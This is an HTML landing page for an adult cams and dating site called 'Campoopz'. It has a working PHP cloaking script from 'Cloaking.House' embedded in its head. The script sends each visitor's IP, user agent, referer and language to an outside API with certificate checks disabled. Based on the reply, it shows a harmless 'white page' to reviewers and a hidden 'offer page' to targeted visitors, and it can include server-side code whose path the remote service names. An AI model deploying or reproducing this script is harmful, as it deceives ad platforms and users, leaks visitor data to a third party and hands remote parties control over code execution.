<!DOCTYPE html>
<html lang="en">
<head>
  <?php

    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
    // С уважением, Cloaking.House


    error_reporting(0);
    mb_internal_encoding('UTF-8');


    $ip_address = $_SERVER['REMOTE_ADDR'];
    $ip_headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_CF_CONNECTING_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_X_COMING_FROM', 
        'HTTP_COMING_FROM', 
        'HTTP_FORWARDED_FOR_IP', 
        'HTTP_X_REAL_IP'
    ];

    
    if ( ! empty($ip_headers)) {
        foreach($ip_headers AS $header)
        {
            if ( ! empty($_SERVER[$header])) {
                $ip_address = trim($_SERVER[$header]);
                break;
            }
        }
    }


    $request_data = [
        'label'         => '413eea777b5eb5437e828614cfc0af91', 
        'user_agent'    => $_SERVER['HTTP_USER_AGENT'], 
        'referer'       => ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', 
        'query'         => ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '', 
        'lang'          => ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '',
        'ip_address'    => $ip_address
    ];
        

    if (function_exists('curl_version')) {

        $request_data = http_build_query($request_data);
        $ch = curl_init('https://cloakit.house/api/v1/check');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER  => TRUE,
            CURLOPT_CUSTOMREQUEST   => 'POST',
            CURLOPT_SSL_VERIFYPEER  => FALSE,
            CURLOPT_TIMEOUT         => 15,
            CURLOPT_POSTFIELDS      => $request_data
        ]);


        $result = curl_exec($ch);
        $info   = curl_getinfo($ch);
        curl_close($ch);


        if ( ! empty($info) && $info['http_code'] == 200) {
            $body = json_decode($result, TRUE);

            
            if ( ! empty($body['filter_type']) && $body['filter_type'] == 'subscription_expired') {
                exit('Your Subscription Expired.');
            }
           

            if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {

                // Options
                $сontext_options = ['ssl' => ['verify_peer' => FALSE, 'verify_peer_name' => FALSE], 'http' => ['header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']]];
                
                // Offer Page
                if ($body['filter_page'] == 'offer') {
                    if ($body['mode_offer_page'] == 'loading') {
                        if (filter_var($body['url_offer_page'], FILTER_VALIDATE_URL)) {
                            echo str_replace('<head>', '<head><base href="' . $body['url_offer_page'] . '" />', file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options)));
                        } elseif (file_exists($body['url_offer_page'])) {
                            if (pathinfo($body['url_offer_page'], PATHINFO_EXTENSION) == 'html') {
                                echo file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options));
                            } else {
                                require_once($body['url_offer_page']);
                            }
                        } else {
                            exit('Offer Page Not Found.');
                        }
                    }

                    if ($body['mode_offer_page'] == 'redirect') {
                        header('Location: ' . $body['url_offer_page'], TRUE, 302);
                        exit(0);
                    }

                    if ($body['mode_offer_page'] == 'iframe') {
                        echo '<iframe src="' . $body['url_offer_page'] . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
                    }
                }


                // White Page
                if ($body['filter_page'] == 'white') {
                    if ($body['mode_white_page'] == 'loading') {
                        if (filter_var($body['url_white_page'], FILTER_VALIDATE_URL)) {
                            echo str_replace('<head>', '<head><base href="' . $body['url_white_page'] . '" />', file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options)));
                        } elseif (file_exists($body['url_white_page'])) {
                            if (pathinfo($body['url_white_page'], PATHINFO_EXTENSION) == 'html') {
                                echo file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options));
                            } else {
                                require_once($body['url_white_page']);
                            }
                        } else {
                            exit('White Page Not Found.');
                        }
                    }

                    if ($body['mode_white_page'] == 'redirect') {
                        header('Location: ' . $body['url_white_page'], TRUE, 302);
                        exit(0);
                    }
                }
            } 
        } else {
            exit('Try again later.');
        }
    } else {
        exit('cURL is not supported on the hosting.');
    }


?>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Campoopz - Adult Cams and Dating</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      text-align: center;
      padding: 50px;
    }
    h1 {
      font-size: 36px;
    }
    p {
      font-size: 18px;
      margin-bottom: 20px;
    }
    .contact-btn {
      background-color: black;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      text-decoration: none;
    }
    .privacy-policy {
      font-size: 14px;
      margin-top: 50px;
    }
    .feature-list {
      text-align: left;
      margin-left: 50px;
      margin-top: 30px;
    }
    .feature-list li {
      margin-bottom: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Campoopz</h1>
    <p>Welcome to Campoopz, your ultimate destination for adult cams, meeting girls, and adult dating.</p>
    <p>At Campoopz, we are dedicated to providing you with a thrilling and secure platform to explore your desires. Here's what sets us apart:</p>
    <ul class="feature-list">
      <li>Live Adult Cams: Immerse yourself in a world of live adult entertainment with our diverse selection of cam models. Whether you're into intimate conversations or steamy performances, our models are here to make your fantasies a reality.</li>
      <li>Meet Girls: Connect with real girls from all over the world who share your interests and desires. Our advanced matching algorithms help you find your ideal partner, whether you're looking for casual chats or something more adventurous.</li>
      <li>Adult Dating: Take your connections to the next level with our adult dating platform. From casual encounters to meaningful relationships, Campoopz offers a safe and discreet environment to explore your passions.</li>
      <li>Privacy and Security: Your privacy is our top priority. We use advanced security measures to keep your information safe and ensure your online experiences remain confidential.</li>
      <li>24/7 Customer Support: Have questions or need assistance? Our dedicated customer support team is available around the clock to provide you with the help you need.</li>
    </ul>
    <a href="tel:+18056064747" class="contact-btn">Contact Us: +1 (805) 606-4747</a>
    <p class="privacy-policy">By using Campoopz, you agree to our <a href="#">Privacy Policy</a>.</p>
  </div>
</body>
</html>
